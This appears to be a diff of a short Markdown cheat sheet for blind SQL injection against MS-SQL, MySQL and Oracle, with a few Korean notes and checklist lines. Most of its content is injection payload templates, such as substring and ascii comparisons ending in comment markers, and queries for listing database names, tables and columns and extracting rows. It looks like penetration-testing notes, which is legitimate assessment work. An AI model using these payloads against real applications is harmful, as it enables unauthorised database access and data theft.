@@ -1,28 +1,27 @@
 # [MS-SQL]  
+
 ## Blind Shape  
 ``` sql
 OO' and substring((query), 1, 1) < 'a'--  
 ```  
 
+## Info
 * get DB NAME  
 ``` sql
 db_name()  
-```
-  
+```  
 * Get Table name  
 ``` sql
 select top 1 name from sysobjects where xtype='U'  
-```
-
+```  
 * Get Column name  
 ``` sql
 select top 1 column_name from information_schema.columns where table_name = '[Table Name]'  
-```
-  
+```  
 * Get Data  
 ``` sql
 select top 1 [Column Name] from [Table Name]  
-```
+```  
   
 # [MySQL]  
 ## Blind Shape  
@@ -30,33 +29,33 @@ select top 1 [Column Name] from [Table Name]
 ???' and ascii(substr((query), 1, 1)) > 'a'#  
 ```  
 
+## Info
 * Get Table Name
 ``` sql
 select table_name from information_schema.tables where table_type='base table' limit 0,1  
                                                                                      ㄴ> 0번 째 테이블  
-```
+```  
   
 # [Oracle]   
+
 ## Blind Shape  
 ``` sql
 and (ascii(SUBSTR(query),1,1))) > 1--  
-```
-  
+```  
+
+## Info
 * Get DB name   
 ``` sql
 select DISTINCT owner FROM all_tables;  
-```
-  
+```  
 * Get Table name   
 ``` sql
 select table_name from all_tables;  
-```
-  
+```  
 * Get Column name   
 ``` sql
 select column_name from all_tab_columns where table_name='[table name]';
-```
-
+```  
 -----------------------------------------------------------------------------------
 Row 갯수 파악
 
@@ -64,7 +63,6 @@ Limit 기능
 ``` sql
 select * from (select rownum rnum, users.* from users) A where A.rnum between 1 and 3  
 ```
-
 -----------------------------------------------------------------------------------
 1. 관리자페이지 접근통제 및 계정관리
 2. 사용자 접근통제 및 로그관리
